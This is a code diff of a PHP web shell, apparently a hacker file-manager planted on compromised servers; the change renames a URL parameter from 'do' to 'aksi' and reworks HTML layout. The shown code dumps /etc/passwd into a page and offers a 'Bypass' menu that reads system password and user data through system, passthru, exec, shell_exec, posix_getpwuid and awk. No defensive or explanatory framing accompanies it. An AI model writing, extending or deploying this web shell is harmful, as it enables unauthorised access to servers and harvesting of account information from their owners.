@@ -1245,7 +1245,7 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download'
 		}else{
 			
 			echo "<form method='post'>
-				<p class='text-danger'>/etc/passw error ?  <a href='?dir=$dir&do=passwbypass'>Bypass Here</a></p>
+				<p class='text-danger'>/etc/passw error ?  <a href='?dir=".$dir."&aksi=passwbypass'>Bypass Here</a></p>
 				<textarea name='passwd' class='form-control' rows='10'>".file_get_contents('/etc/passwd')."</textarea><br/>
 				<input type='submit' class='btn btn-danger btn-block' value='Get Config!!'>";
         }
@@ -1253,27 +1253,24 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download'
 	}
 	
 	
-	if($_GET['do'] == 'passwbypass') {
+	if($_GET['aksi'] == 'passwbypass') {
 		echo '<div claas="container">
 			<form method="POST">
 				<p class="text-center">Bypass etc/passw With :</p>
-				<div class="row">
-				<div class="d-flex justify-content-center flex-wrap col-md-6">
+				<div class="d-flex justify-content-center flex-wrap">
 					<input type="submit" class="fiture btn btn-danger btn-sm" value="System Function" name="syst">
 					<input type="submit" class="fiture btn btn-danger btn-sm" value="Passthru Function" name="passth">
 					<input type="submit" class="fiture btn btn-danger btn-sm" value="Exec Function" name="ex">
 					<input type="submit" class="fiture btn btn-danger btn-sm" value="Shell_exec Function" name="shex">
 					<input type="submit" class="fiture btn btn-danger btn-sm" value="Posix_getpwuid Function" name="melex">
-				</div>
-				
-				<div class="d-flex justify-content-center flex-wrap col-md-6">
-					<p class="text-center">Bypass User With :</p>
+				</div><hr/>
+				<p class="text-center">Bypass User With :</p>
+				<div class="d-flex justify-content-center flex-wrap">
 					<input type="submit" class="fiture btn btn-warning btn-sm" value="Awk Program" name="awkuser">
 					<input type="submit" class="fiture btn btn-warning btn-sm" value="System Function" name="systuser">
 					<input type="submit" class="fiture btn btn-warning btn-sm" value="Passthru Function" name="passthuser">	
 					<input type="submit" class="fiture btn btn-warning btn-sm" value="Exec Function" name="exuser">		
 					<input type="submit" class="fiture btn btn-warning btn-sm" value="Shell_exec Function" name="shexuser">
-				</div>
 				</div>
 			</form>';
 			
